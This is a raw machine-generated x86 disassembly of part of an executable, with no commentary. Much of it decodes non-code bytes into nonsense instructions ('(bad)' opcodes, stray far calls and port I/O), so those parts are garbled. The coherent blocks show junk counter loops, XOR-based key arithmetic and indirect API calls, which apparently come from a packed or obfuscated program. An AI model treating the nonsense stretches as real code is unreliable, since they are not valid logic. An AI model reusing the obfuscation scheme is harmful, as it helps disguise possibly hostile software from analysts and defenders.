  40832b:	into   
  40832c:	sbb    BYTE PTR [ebp+eax*4-0x52],dl
  408330:	mov    bh,0xb1
  408332:	push   0xd4037db8
  408337:	mov    fs,WORD PTR [esi+0x7f]
  40833a:	dec    ebx
  40833b:	imul   esp,esp,0xffffff94
  40833e:	xchg   edi,eax
  40833f:	cmp    eax,esi
  408341:	sub    ch,cl
  408343:	and    al,0xd4
  408345:	ds gs xchg ax,ax
  408349:	(bad)  
  40834a:	into   
  40834b:	push   eax
  40834c:	int    0xb8
  40834e:	lods   eax,DWORD PTR ds:[esi]
  40834f:	data16 jecxz 0x408313
  408352:	adc    bh,ah
  408354:	(bad)  
  408356:	jle    0x408359
  408358:	sub    dl,BYTE PTR [ebx-0x51f295b5]
  40835e:	clc    
  40835f:	pop    ss
  408360:	adc    dl,BYTE PTR [ebx+0x21]
  408363:	and    dh,BYTE PTR [ecx+0x2fc32895]
  408369:	in     eax,0xa5
  40836b:	xchg   edx,eax
  40836c:	nop
  40836d:	xchg   esi,eax
  40836e:	or     eax,0xe60aaa28
  408373:	sub    ebx,edx
  408375:	in     eax,dx
  408376:	push   ss
  408377:	xor    cl,BYTE PTR [edx+ebp*8]
  40837a:	jo     0x408314
  40837c:	and    eax,DWORD PTR [edi]
  40837e:	test   BYTE PTR [ecx-0x52],al
  408381:	xchg   bh,ch
  408383:	outs   dx,BYTE PTR ds:[esi]
  408385:	mov    eax,ds:0x7f2a0322
  40838a:	xor    al,dh
  40838c:	push   ecx
  40838d:	pop    ss
  40838e:	or     al,0x71
  408390:	mov    ah,dh
  408392:	lods   eax,DWORD PTR es:[esi]
  408394:	and    ebp,DWORD PTR [ebx-0x35]
  408397:	or     eax,DWORD PTR [ebx]
  408399:	popa   
  40839a:	cmp    al,0x3d
  40839c:	sti    
  40839d:	lods   eax,DWORD PTR ds:[esi]
  40839e:	in     eax,dx
  40839f:	jecxz  0x408377
  4083a1:	aas    
  4083a2:	stos   BYTE PTR es:[edi],al
  4083a3:	push   cs
  4083a4:	js     0x4083b4
  4083a6:	out    0x1f,al
  4083a8:	fiadd  WORD PTR [ebx+esi*4-0x10]
  4083ac:	popf   
  4083ad:	addr16 dec ebx
  4083af:	jno    0x408344
  4083b1:	push   0x578a9771
  4083b6:	(bad)  
  4083b7:	dec    edi
  4083b8:	scas   al,BYTE PTR es:[edi]
  4083b9:	push   esi
  4083ba:	pop    eax
  4083bb:	loope  0x40836d
  4083bd:	js     0x4083b3
  4083bf:	(bad)  
  4083c0:	cdq    
  4083c1:	lahf   
  4083c2:	push   esp
  4083c3:	cmp    eax,0x157a1146
  4083c8:	test   DWORD PTR [esi+0x4c626521],0xced4d7aa
  4083d2:	ja     0x4083ff
  4083d4:	cli    
  4083d5:	and    ebx,DWORD PTR [edx+0x4a]
  4083d8:	push   0xffffffba
  4083da:	(bad)
  4083de:	pushf  
  4083df:	push   edi
  4083e0:	or     BYTE PTR [edi+0x21a89618],ch
  4083e6:	cmp    eax,0xe0cbb9da
  4083eb:	xor    ch,cl
  4083ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083ee:	xor    al,0x72
  4083f0:	pop    edx
  4083f1:	mov    ebp,0xadbe02cb
  4083f6:	retf   
  4083f7:	pop    esp
  4083f8:	inc    esi
  4083f9:	xor    dh,ah
  4083fb:	loope  0x4083bf
  4083fd:	jbe    0x408466
  4083ff:	test   bh,ch
  408401:	retf   
  408402:	mov    eax,ds:0xb4a4642e
  408407:	mov    ds:0x88e703e4,eax
  40840c:	push   ds
  40840d:	xor    eax,0x402ed016
  408412:	adc    edi,DWORD PTR [ebx-0x51]
  408415:	xchg   edx,eax
  408416:	xor    DWORD PTR ds:0x30164eeb,ebp
  40841c:	into   
  40841d:	adc    al,0x20
  40841f:	push   edi
  408420:	sub    BYTE PTR [esi-0x72],al
  408423:	sbb    edx,DWORD PTR [edx+ecx*4-0x2701c1b2]
  40842a:	fwait
  40842b:	inc    esi
  40842c:	cli    
  40842d:	js     0x408410
  40842f:	xor    BYTE PTR [ecx+0x20262231],ah
  408435:	fcompp 
  408437:	out    dx,eax
  408438:	cmc    
  408439:	int3   
  40843a:	loop   0x4083be
  40843c:	dec    edx
  40843d:	push   edi
  40843e:	ret    
  40843f:	push   ebx
  408440:	hlt    
  408441:	mov    al,ds:0x73e6785
  408446:	mov    bl,0xb3
  408448:	mov    bl,0xe1
  40844a:	xchg   DWORD PTR [esi+ebx*2],esp
  40844d:	adc    ch,BYTE PTR [eax+0x4]
  408450:	pop    ebp
  408451:	sub    cl,BYTE PTR [edi]
  408453:	pushf  
  408454:	dec    ebp
  408455:	popf   
  408456:	adc    bh,dh
  408458:	je     0x408402
  40845a:	xchg   ebx,eax
  40845b:	cmp    eax,0x30d49d71
  408460:	pop    eax
  408461:	push   edx
  408462:	mov    ebp,0xf5862857
  408467:	iret   
  408468:	jecxz  0x408431
  40846a:	cmp    edi,DWORD PTR [edx+0x3772663c]
  408470:	xor    DWORD PTR [edx+ebp*4],edx
  408473:	gs sub al,0x46
  408476:	ja     0x4084be
  408478:	cli    
  408479:	icebp  
  40847a:	test   eax,esi
  40847c:	add    edx,DWORD PTR [ebx-0x4a9e63b4]
  408482:	xchg   edi,eax
  408483:	jb     0x409cf2
  408489:	mov    edx,DWORD PTR [ebp-0x28]
  40848c:	sbb    edi,0x56c5
  408492:	mov    edi,DWORD PTR [ebp-0x4]
  408495:	xor    ebx,DWORD PTR ds:0x432dd6
  40849b:	xor    edx,eax
  40849d:	and    DWORD PTR ds:0x434411,0x0
  4084a7:	jmp    0x4084bb
  4084ac:	xor    ebx,ebx
  4084ae:	xor    ebx,DWORD PTR ds:0x434411
  4084b4:	inc    ebx
  4084b5:	mov    DWORD PTR ds:0x434411,ebx
  4084bb:	cmp    DWORD PTR ds:0x434411,0x18
  4084c2:	jae    0x4084e3
  4084c8:	cmp    DWORD PTR ds:0x434411,0x22
  4084cf:	jne    0x4084de
  4084d5:	push   DWORD PTR [ebp-0x1c]
  4084d8:	call   DWORD PTR ds:0x432c42
  4084de:	jmp    0x4084ac
  4084e3:	xor    edi,eax
  4084e5:	add    edi,ecx
  4084e7:	mov    ebx,DWORD PTR ds:0x43441d
  4084ed:	add    DWORD PTR ds:0x432dca,ebx
  4084f3:	add    edx,ecx
  4084f5:	add    DWORD PTR ds:0x434366,ecx
  4084fb:	imul   edx,edi
  4084fe:	mov    edi,DWORD PTR [ebp-0x8]
  408501:	mov    ebx,DWORD PTR ds:0x43442d
  408507:	or     DWORD PTR ds:0x434419,ebx
  40850d:	mov    ebx,DWORD PTR [ebp-0x10]
  408510:	sub    ebx,edi
  408512:	cmp    ebx,edx
  408514:	mov    DWORD PTR ds:0x434425,0x4da5
  40851e:	ja     0x40879c
  408524:	and    DWORD PTR ds:0x4326fc,0x0
  40852e:	jmp    0x408540
  408533:	mov    edx,DWORD PTR ds:0x4326fc
  408539:	inc    edx
  40853a:	mov    DWORD PTR ds:0x4326fc,edx
  408540:	cmp    DWORD PTR ds:0x4326fc,0x1b
  408547:	jae    0x408786
  40854d:	cmp    DWORD PTR ds:0x4326fc,0x1d
  408554:	jne    0x408563
  40855a:	push   DWORD PTR [ebp-0x28]
  40855d:	call   DWORD PTR ds:0x4329d2
  408563:	jmp    0x408533
  408568:	adc    DWORD PTR ds:0x432dc6,0x7927
  408572:	jmp    0x408786
  408577:	rcr    DWORD PTR [ebp-0xc8d3cb2],0x51
  40857e:	popf   
  40857f:	push   es
  408580:	stos   DWORD PTR es:[edi],eax
  408581:	arpl   bp,sp
  408583:	push   ss
  408584:	pop    edi
  408585:	nop
  408586:	fsubr  QWORD PTR [eax+0x697070d4]
  40858c:	jg     0x4085fe
  40858e:	jo     0x4085a2
  408590:	cmp    eax,0x79bd8d0d
  408595:	inc    edi
  408596:	xchg   ecx,eax
  408597:	xchg   BYTE PTR [ecx+0x1a],al
  40859a:	jp     0x4085dc
  40859c:	das    
  40859d:	push   ds
  40859e:	std    
  40859f:	je     0x408584
  4085a1:	pop    edx
  4085a2:	sub    BYTE PTR [eax-0x30],dl
  4085a5:	inc    eax
  4085a6:	call   0xa0c24ce5
  4085ab:	repz enter 0x4747,0xac
  4085b0:	cld    
  4085b1:	sar    BYTE PTR [eax+0x29],1
  4085b4:	out    0x73,al
  4085b6:	js     0x4085da
  4085b8:	fadd   QWORD PTR [ecx-0x45c5b090]
  4085be:	retf   0x6acb
  4085c1:	arpl   di,dx
  4085c3:	xchg   esi,eax
  4085c4:	(bad)  
  4085c5:	fs (bad) 
  4085c7:	lods   al,BYTE PTR ds:[esi]
  4085c8:	loope  0x40857d
  4085ca:	mov    BYTE PTR [ebx-0x8],0xcc
  4085ce:	and    al,BYTE PTR [ebp+0x61a65493]
  4085d4:	test   dl,bh
  4085d6:	idiv   dh
  4085d8:	or     ebp,ebx
  4085da:	push   edx
  4085db:	inc    eax
  4085dc:	push   ebp
  4085dd:	mov    ah,0xfb
  4085df:	or     BYTE PTR [edi+esi*4-0x1258e236],al
  4085e6:	mov    DWORD PTR ds:0x581605e0,esp
  4085ec:	loopne 0x40865f
  4085ee:	pushf  
  4085ef:	(bad)  
  4085f1:	jecxz  0x408648
  4085f3:	ins    DWORD PTR es:[edi],dx
  4085f4:	loop   0x408636
  4085f6:	fwait
  4085f7:	xchg   edx,eax
  4085f8:	adc    ebx,DWORD PTR [eax]
  4085fa:	and    al,0x62
  4085fc:	sub    edi,DWORD PTR [esi-0x2d]
  4085ff:	sbb    ah,BYTE PTR [edx-0x1b5674a3]
  408605:	add    al,0x97
  408607:	push   ecx
  408608:	push   0xffffffea
  40860a:	mov    al,0xe2
  40860c:	jae    0x40864d
  40860e:	out    dx,eax
  40860f:	rcr    BYTE PTR [eax+0x11b745cf],0x22
  408616:	stos   BYTE PTR es:[edi],al
  408617:	or     eax,0x90c78de5
  40861c:	mov    ebp,0xd5d34c78
  408621:	and    eax,0xc309a72f
  408626:	(bad)  
  408627:	cmc    
  408628:	lea    ecx,[esi]
  40862a:	aas    
  40862b:	and    DWORD PTR [esi-0x1b5033fa],0xd
  408632:	jb     0x4085e7
  408634:	ds nop
  408636:	adc    cl,BYTE PTR [edx-0x5d09630f]
  40863c:	or     esi,DWORD PTR [ecx+0x47]
  40863f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408640:	imul   ebx,DWORD PTR [edx+0x56],0x50c1c446
  408647:	fdiv   QWORD PTR [esi-0x1b0983f1]
  40864d:	mov    ebx,DWORD PTR [ebp-0x5b2a0c63]
  408653:	push   edi
  408654:	mov    cs,ecx
  408656:	xor    BYTE PTR [eax],0xe1
  408659:	ds push eax
  40865b:	jo     0x408647
  40865d:	into   
  40865e:	mov    ah,dh
  408660:	jge    0x4086d6
  408662:	mov    ah,0x32
  408664:	and    cl,BYTE PTR [edx+eiz*8+0x5b]
  408668:	mov    edx,0xb0c8c51a
  40866d:	lock call DWORD PTR [eax]
  408670:	mov    bl,0x38
  408672:	or     edi,DWORD PTR [ebp-0x4]
  408675:	mov    dh,0xe1
  408677:	shl    ebx,0x61
  40867a:	fs mov ah,0x41
  40867d:	repnz mov ebp,0xa5709308
  408683:	push   ebx
  408684:	sar    BYTE PTR [ecx-0xf],1
  408687:	(bad)  [ecx+0x71]
  40868a:	sbb    DWORD PTR [eax+0x7cf3a3bb],esp
  408690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408691:	aam    0x9e
  408693:	aaa    
  408694:	xchg   edi,eax
  408695:	dec    ecx
  408696:	(bad)  
  408697:	ret    0x8e63
  40869a:	xchg   BYTE PTR [ebp+0x3d],dl
  40869d:	add    DWORD PTR [eax-0x71],edi
  4086a0:	repz inc edi
  4086a2:	retf   
  4086a3:	jbe    0x40862e
  4086a5:	in     al,0x70
  4086a7:	dec    edi
  4086a8:	sub    ch,al
  4086aa:	inc    ebx
  4086ab:	cdq    
  4086ac:	rcl    DWORD PTR [edx],cl
  4086ae:	xor    eax,0x3b4410c0
  4086b3:	popa   
  4086b4:	out    0xad,al
  4086b6:	test   BYTE PTR [bp+di],0xeb
  4086ba:	popf   
  4086bb:	fstp   TBYTE PTR [ebp-0x3]
  4086be:	mov    ds:0x9b5c58c3,al
  4086c3:	jno    0x40868b
  4086c5:	(bad)  
  4086c6:	call   0xbba0:0xd697454b
  4086cd:	jno    0x40873f
  4086cf:	pop    eax
  4086d0:	pop    ebp
  4086d1:	pop    ebx
  4086d2:	mov    ds:0xadf3a0f2,al
  4086d7:	test   BYTE PTR [edi],al
  4086d9:	cli    
  4086da:	jmp    0x4086dc
  4086dc:	mov    ch,0xda
  4086de:	inc    eax
  4086df:	adc    al,0xc1
  4086e1:	mov    edx,0xadf4b21f
  4086e6:	test   esi,ebp
  4086e8:	adc    BYTE PTR [eax+0x6f],cl
  4086eb:	sub    BYTE PTR [ebp+0x20],ch
  4086ee:	or     BYTE PTR [ecx],0x9
  4086f1:	mov    al,ds:0x13b0a32c
  4086f6:	xchg   BYTE PTR [ecx+0x6743d7e],bh
  4086fc:	xchg   esi,eax
  4086fd:	(bad)  
  4086fe:	pop    ecx
  4086ff:	xchg   edi,eax
  408700:	xchg   BYTE PTR [ebp+0x2f],bh
  408703:	(bad)  
  408704:	push   esi
  408705:	adc    bh,BYTE PTR [esi+0x2c]
  408708:	sbb    edi,DWORD PTR [edx+0x71]
  40870b:	xor    al,0xbd
  40870d:	ror    DWORD PTR [edi-0x1c],0xab
  408711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408712:	mov    al,0xd9
  408714:	and    BYTE PTR [eax+0x7f],bh
  408717:	jns    0x4086d3
  408719:	(bad)  
  40871a:	fist   WORD PTR [eax+0x3d1c05cc]
  408720:	mov    ecx,0x1450f444
  408725:	aas    
  408726:	sub    BYTE PTR [esi-0x48a1ce99],ch
  40872c:	fistp  QWORD PTR [esi-0x4ce8cee9]
  408732:	xchg   ebx,eax
  408733:	xor    DWORD PTR [edx+0x75],esp
  408736:	imul   eax,DWORD PTR [edx+edx*8-0x2a],0xd78eafc7
  40873e:	aaa    
  40873f:	pusha  
  408740:	popa   
  408741:	mov    eax,DWORD PTR [edx+0x77]
  408744:	dec    ecx
  408745:	ins    BYTE PTR es:[edi],dx
  408746:	mov    ah,0xf0
  408748:	dec    eax
  408749:	xchg   ebp,eax
  40874a:	xchg   esp,eax
  40874b:	sar    BYTE PTR [ebp+esi*2-0x5d],1
  40874f:	xor    BYTE PTR [eax-0x26256fe4],0xe4
  408756:	jne    0x4086db
  408758:	and    ecx,DWORD PTR [eax]
  40875a:	loopne 0x408731
  40875c:	xchg   ecx,esi
  40875e:	or     esp,DWORD PTR [edi]
  408760:	push   cs
  408761:	mov    eax,ds:0xe095c367
  408766:	dec    eax
  408767:	sahf   
  408768:	push   edx
  408769:	push   es
  40876a:	(bad)  
  40876b:	mov    edx,0x14963e9
  408770:	ret    
  408771:	pop    eax
  408772:	xor    BYTE PTR [ecx+ebp*2],dl
  408775:	add    BYTE PTR [ebx+0x3b],0xae
  408779:	js     0x4087d9
  40877b:	mov    cl,0xf0
  40877d:	div    ah
  40877f:	sub    bh,0x30
  408782:	in     eax,dx
  408783:	shl    ebx,cl
  408785:	pushf  
  408786:	mov    edx,DWORD PTR [ebp-0x4]
  408789:	xor    edx,eax
  40878b:	add    edx,ecx
  40878d:	mov    DWORD PTR ds:0x43438a,0x22ee
  408797:	jmp    0x408b38
  40879c:	and    edx,edi
  40879e:	mov    edx,DWORD PTR [ebp-0x2c]
  4087a1:	or     edi,edi
  4087a3:	mov    edi,DWORD PTR [ebp-0x4]
  4087a6:	xor    edx,eax
  4087a8:	not    ebx
  4087aa:	xor    edi,eax
  4087ac:	sub    DWORD PTR ds:0x43438a,0x43441d
  4087b6:	add    edi,ecx
  4087b8:	or     ebx,DWORD PTR ds:0x434415
  4087be:	add    edx,ecx
  4087c0:	or     DWORD PTR ds:0x43438e,edi
  4087c6:	imul   edx,edi
  4087c9:	adc    DWORD PTR ds:0x434415,ebx
  4087cf:	mov    edi,DWORD PTR [ebp-0x8]
  4087d2:	sub    ebx,0x42e0
  4087d8:	mov    ebx,DWORD PTR [ebp-0x10]
  4087db:	and    DWORD PTR ds:0x434372,0x1110
  4087e5:	sub    ebx,edi
  4087e7:	cmp    ebx,edx
  4087e9:	mov    DWORD PTR ds:0x432708,0x5f46
  4087f3:	ja     0x40880b
  4087f9:	mov    edx,DWORD PTR [ebp-0x28]
  4087fc:	mov    DWORD PTR ds:0x434425,0x1e0
  408806:	jmp    0x408b2a
  40880b:	mov    edx,DWORD PTR [ebp-0x30]
  40880e:	mov    edi,DWORD PTR [ebp-0x4]
  408811:	xor    DWORD PTR ds:0x432dd2,ecx
  408817:	xor    edx,eax
  408819:	mov    DWORD PTR ds:0x43436a,0x13
  408823:	cmp    DWORD PTR ds:0x43436a,0x0
  40882a:	je     0x40887c
  408830:	cmp    DWORD PTR ds:0x43436a,0x4
  408837:	jne    0x40884e
  40883d:	push   0x43287d
  408842:	push   DWORD PTR [ebp-0x20]
  408845:	push   DWORD PTR [ebp-0xc]
  408848:	call   DWORD PTR ds:0x432cfa
  40884e:	cmp    DWORD PTR ds:0x43436a,0x5
  408855:	jne    0x40886a
  40885b:	xor    ebx,ebx
  40885d:	add    ebx,DWORD PTR ds:0x43436a
  408863:	dec    ebx
  408864:	mov    DWORD PTR ds:0x43436a,ebx
  40886a:	mov    ebx,DWORD PTR ds:0x43436a
  408870:	dec    ebx
  408871:	mov    DWORD PTR ds:0x43436a,ebx
  408877:	jmp    0x408823
  40887c:	xor    edi,eax
  40887e:	add    edi,ecx
  408880:	add    edx,ecx
  408882:	imul   edx,edi
  408885:	mov    edi,DWORD PTR [ebp-0x8]
  408888:	mov    ebx,DWORD PTR [ebp-0x10]
  40888b:	sub    ebx,edi
  40888d:	cmp    ebx,edx
  40888f:	ja     0x40889d
  408895:	mov    edx,DWORD PTR [ebp-0x2c]
  408898:	jmp    0x408b2a
  40889d:	mov    edx,DWORD PTR [ebp-0x34]
  4088a0:	mov    edi,DWORD PTR [ebp-0x4]
  4088a3:	xor    edx,eax
  4088a5:	xor    edi,eax
  4088a7:	add    edi,ecx
  4088a9:	add    edx,ecx
  4088ab:	imul   edx,edi
  4088ae:	mov    edi,DWORD PTR [ebp-0x8]
  4088b1:	mov    ebx,DWORD PTR [ebp-0x10]
  4088b4:	sub    ebx,edi
  4088b6:	cmp    ebx,edx
  4088b8:	ja     0x4088c6
  4088be:	mov    edx,DWORD PTR [ebp-0x30]
  4088c1:	jmp    0x408b2a
  4088c6:	mov    edx,DWORD PTR [ebp-0x38]
  4088c9:	mov    edi,DWORD PTR [ebp-0x4]
  4088cc:	xor    edx,eax
  4088ce:	xor    edi,eax
  4088d0:	add    edi,ecx
  4088d2:	add    edx,ecx
  4088d4:	imul   edx,edi
  4088d7:	mov    edi,DWORD PTR [ebp-0x8]
  4088da:	mov    ebx,DWORD PTR [ebp-0x10]
  4088dd:	sub    ebx,edi
  4088df:	cmp    ebx,edx
  4088e1:	ja     0x4088ef
  4088e7:	mov    edx,DWORD PTR [ebp-0x34]
  4088ea:	jmp    0x408b2a
  4088ef:	mov    edx,DWORD PTR [ebp-0x3c]
  4088f2:	mov    edi,DWORD PTR [ebp-0x4]
  4088f5:	xor    edx,eax
  4088f7:	xor    edi,eax
  4088f9:	add    edx,ecx
  4088fb:	add    edi,ecx
  4088fd:	imul   edx,edi
  408900:	mov    edi,DWORD PTR [ebp-0x8]
  408903:	mov    ebx,DWORD PTR [ebp-0x10]
  408906:	sub    ebx,edi
  408908:	cmp    ebx,edx
  40890a:	mov    edx,DWORD PTR [ebp-0x38]
  40890d:	jbe    0x408b2a
  408913:	mov    edx,DWORD PTR [ebp-0x3c]
  408916:	jmp    0x408b2a
  40891b:	imul   ebx,DWORD PTR [edx-0x5eb67e05],0x71
  408922:	jb     0x40895b
  408924:	adc    esi,DWORD PTR [ebx-0xa4abdb5]
  40892a:	fsub   DWORD PTR [ecx+0x697070d2]
  408930:	jg     0x4089a2
  408932:	jo     0x408906
  408934:	xor    eax,0x87be572
  408939:	nop
  40893a:	popf   
  40893b:	cmp    ah,0x65
  40893e:	xchg   ebx,eax
  40893f:	jbe    0x4089a6
  408941:	mov    dl,0xdf
  408943:	pop    ebp
  408944:	sbb    eax,0xfd5a64c7
  408949:	das    
  40894a:	sub    DWORD PTR [edx],esp
  40894c:	mov    ah,0x56
  40894e:	jge    0x4089bc
  408950:	imul   ecx,DWORD PTR [ebx+ebx*1+0x6a],0x56
  408955:	es add al,0x4a
  408958:	stos   BYTE PTR es:[edi],al
  408959:	mov    ah,bl
  40895b:	mov    ch,0xc9
  40895d:	lock mov edx,0x9de8d5ce
  408963:	nop
  408964:	push   ss
  408965:	inc    esi
  408966:	fsub   DWORD PTR [esi+0x54c02cc4]
  40896c:	aam    0xe6
  40896e:	test   DWORD PTR [edx-0x4],esi
  408971:	push   ebx
  408972:	stos   DWORD PTR es:[edi],eax
  408973:	xchg   ebp,eax
  408974:	in     al,dx
  408975:	repnz sbb ecx,DWORD PTR [ebx+eax*8]
  408979:	repz push esp
  40897b:	mov    ebp,0x9a9b5766
  408980:	(bad)  
  408981:	mov    edi,0x2f068a0
  408986:	sbb    DWORD PTR [ecx],ebp
  408988:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408989:	inc    ecx
  40898a:	push   ebp
  40898b:	and    BYTE PTR [edx+edi*1-0x31],dl
  40898f:	push   ecx
  408990:	mov    dl,0x3e
  408992:	mov    ds:0xdb7cc38c,al
  408997:	(bad)  
  408998:	jecxz  0x408964
  40899a:	aaa    
  40899b:	push   cs
  40899c:	push   ebx
  40899d:	mov    dl,0xa
  40899f:	fistp  WORD PTR [ebp-0x31]
  4089a2:	pop    es
  4089a3:	retf   0x77a1
  4089a6:	xlat   BYTE PTR ds:[ebx]
  4089a7:	loope  0x40897f
  4089a9:	mov    al,0x1f
  4089ab:	stc    
  4089ac:	push   ds
  4089ad:	aas    
  4089ae:	push   es
  4089af:	rcr    BYTE PTR gs:[ecx+esi*2-0x28ee2e35],0x3c
  4089b8:	stc    
  4089b9:	dec    ebx
  4089ba:	sub    eax,0xf0110c7d
  4089bf:	mov    edx,0xa049a55c
  4089c4:	mov    al,BYTE PTR [edx]
  4089c6:	sbb    BYTE PTR [edi+edi*2],bh
  4089c9:	push   0xffffffb6
  4089cb:	aaa    
  4089cc:	xor    DWORD PTR [edx+0x614323d6],eax
  4089d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089d3:	or     BYTE PTR [eax-0x389fbb12],dh
  4089d9:	xchg   ebp,eax
  4089da:	pop    ebx
  4089db:	nop
  4089dc:	dec    edi
  4089dd:	fild   QWORD PTR [ebp+0x3b]
  4089e0:	loope  0x4089b7
  4089e2:	cmp    al,0x63
  4089e4:	sbb    dl,ch
  4089e6:	sub    eax,ecx
  4089e8:	out    dx,al
  4089e9:	adc    eax,0xffffffc7
  4089ec:	scas   al,BYTE PTR es:[edi]
  4089ed:	pop    edx
  4089ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089ef:	jae    0x4089f0
  4089f1:	jg     0x408998
  4089f3:	call   0xcbd2:0x34384038
  4089fa:	into   
  4089fb:	shr    BYTE PTR [esi*2+0x762528e0],0x1d
  408a03:	sbb    edx,DWORD PTR [ebp-0x55]
  408a06:	retf   0x8583
  408a09:	pop    ebp
  408a0a:	shl    ebx,0xcd
  408a0d:	div    al
  408a0f:	inc    edx
  408a10:	lea    esp,ds:0x53b24af
  408a16:	jns    0x4089b2
  408a18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a19:	and    ah,BYTE PTR [edx]
  408a1b:	sbb    BYTE PTR [edx],0xed
  408a1e:	out    dx,al
  408a1f:	int3   
  408a20:	bound  ecx,QWORD PTR [eax]
  408a22:	dec    edx
  408a23:	pop    es
  408a24:	adc    al,0x7c
  408a26:	pop    ss
  408a27:	inc    ebx
  408a29:	clc    
  408a2a:	stc    
  408a2b:	mov    eax,0x1f104a02
  408a30:	dec    esi
  408a31:	ret    
  408a32:	sbb    cl,BYTE PTR [edi+ebp*2+0xa8e78d5]
  408a39:	mov    eax,es
  408a3b:	ret    0x49f9
  408a3e:	sbb    ah,BYTE PTR [esi-0x1167478b]
  408a44:	mov    esp,0x4ac6e93
  408a49:	push   cs
  408a4a:	popa   
  408a4b:	inc    edx
  408a4c:	sahf   
  408a4d:	xor    DWORD PTR [esi],ebp
  408a4f:	jne    0x408abe
  408a51:	jge    0x408a01
  408a53:	fidiv  WORD PTR [edx+0x5]
  408a56:	dec    esi
  408a57:	xor    ebx,0xffffffd6
  408a5a:	(bad)  
  408a5b:	sbb    esp,DWORD PTR [ebx+ecx*8-0x377adab0]
  408a62:	push   eax
  408a63:	mov    dl,0x78
  408a65:	(bad)  
  408a67:	fld    QWORD PTR [edi+ebp*8]
  408a6a:	imul   esi,DWORD PTR [edx+0xd],0xffffffde
  408a6e:	into   
  408a6f:	int    0xe4
  408a71:	mov    ?,WORD PTR [ecx-0x42e23c9f]
  408a77:	daa    
  408a78:	or     ch,dl
  408a7a:	inc    edi
  408a7b:	xchg   dh,bh
  408a7d:	(bad)  
  408a7e:	iret   
  408a7f:	loope  0x408adb
  408a81:	enter  0x6079,0x7f
  408a85:	adc    al,0x43
  408a87:	pop    ds
  408a88:	xchg   ebp,eax
  408a89:	push   ss
  408a8a:	fist   DWORD PTR ds:0xe0829cb2
  408a90:	or     bl,BYTE PTR [ecx]
  408a92:	mov    al,ds:0x7f013610
  408a97:	xchg   DWORD PTR [ebx-0x1488501f],esp
  408a9d:	xchg   BYTE PTR [ebp-0x4],dl
  408aa0:	mov    ecx,0x1a903f74
  408aa5:	and    ebp,edi
  408aa7:	xor    al,0x95
  408aa9:	out    dx,al
  408aaa:	xchg   ecx,eax
  408aab:	in     al,dx
  408aac:	(bad)  
  408aad:	cmp    BYTE PTR [ebp-0x56549c8d],cl
  408ab3:	or     eax,0x48ab5f48
  408ab8:	mov    ds:0x2d248d29,eax
  408abd:	test   ch,0x68
  408ac0:	sar    DWORD PTR [eax],1
  408ac2:	inc    esi
  408ac3:	rol    ebx,1
  408ac5:	rcr    BYTE PTR [ecx+0x453d2ec7],0x56
  408acc:	imul   eax,DWORD PTR [esi+0x16],0xffffff99
  408ad0:	dec    esp
  408ad1:	repnz out 0x2b,eax
  408ad4:	out    dx,eax
  408ad5:	popf   
  408ad6:	push   cs
  408ad7:	lods   eax,DWORD PTR ds:[esi]
  408ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ad9:	jl     0x408a9e
  408adb:	fmul   QWORD PTR [esi+edx*2-0x11]
  408adf:	and    cl,ah
  408ae1:	pop    edi
  408ae2:	dec    eax
  408ae3:	dec    edi
  408ae4:	pop    ds
  408ae5:	sub    esi,eax
  408ae7:	xchg   ebx,eax
  408ae8:	je     0x408b4f
  408aea:	and    BYTE PTR [ebx-0x6c0c71ce],0x8c
  408af1:	int3   
  408af2:	sahf   
  408af3:	clc    
  408af4:	mov    ds:0x918d7bd8,al
  408af9:	fs ret 
  408afb:	add    al,0x6f
  408afd:	push   es
  408afe:	adc    eax,0xc42d78ba
  408b03:	popf   
  408b04:	int    0x3e
  408b06:	sbb    al,0xa2
  408b08:	xor    DWORD PTR [ebx-0x36],esp
  408b0b:	mov    al,BYTE PTR [edi]
  408b0d:	jns    0x408b02
  408b0f:	pop    ds
  408b10:	fcmovnu st,st(2)
  408b12:	push   esp
  408b13:	pop    ebp
  408b14:	out    dx,al
  408b15:	ret    
  408b16:	and    ebx,ecx
  408b18:	test   al,0x6
  408b1a:	jecxz  0x408afd
  408b1c:	inc    esp
  408b1d:	in     al,0x74
  408b1f:	fwait
  408b20:	leave  
  408b21:	test   BYTE PTR [edi],cl
  408b23:	xor    eax,0xd64408ba
  408b28:	les    edx,FWORD PTR [eax]
  408b2a:	mov    edi,DWORD PTR [ebp-0x4]
  408b2d:	xor    edi,eax
  408b2f:	xor    edx,eax
  408b31:	add    edi,ecx
  408b33:	add    edx,ecx
  408b35:	imul   edx,edi
  408b38:	mov    DWORD PTR [ebp+0xc],edx
  408b3b:	mov    edx,DWORD PTR [ebp+0xc]
  408b3e:	mov    DWORD PTR [ebp-0x24],edx
  408b41:	mov    edx,DWORD PTR [ebp-0x8]
  408b44:	add    edx,DWORD PTR [ebp-0x40]
  408b47:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408b4e:	mov    DWORD PTR [ebp-0x1c],edx
  408b51:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  408b58:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  408b5f:	mov    edx,DWORD PTR [ebp-0x18]
  408b62:	xor    edx,eax
  408b64:	add    edx,ecx
  408b66:	jmp    0x409637
  408b6b:	mov    edx,DWORD PTR [ebp-0x18]
  408b6e:	xor    edx,eax
  408b70:	add    edx,DWORD PTR [ebp-0x14]
  408b73:	mov    edi,DWORD PTR [ebp-0x1c]
  408b76:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408b7d:	mov    BYTE PTR [ebp+0xf],dl
  408b80:	jmp    0x408d94
  408b85:	arpl   WORD PTR [ecx+edx*8+0x7359f11a],dx
  408b8c:	push   ecx
  408b8d:	out    0xb0,eax
  408b8f:	jnp    0x408bf2
  408b91:	or     DWORD PTR [edx-0x2f6576c1],0x70
  408b98:	jo     0x408c03
  408b9a:	jg     0x408c0c
  408b9c:	jo     0x408c07
  408b9e:	mov    ebp,0x5859aed1
  408ba3:	dec    ecx
  408ba4:	pusha  
  408ba5:	cwde   
  408ba6:	sub    BYTE PTR [ecx],bl
  408ba8:	lahf   
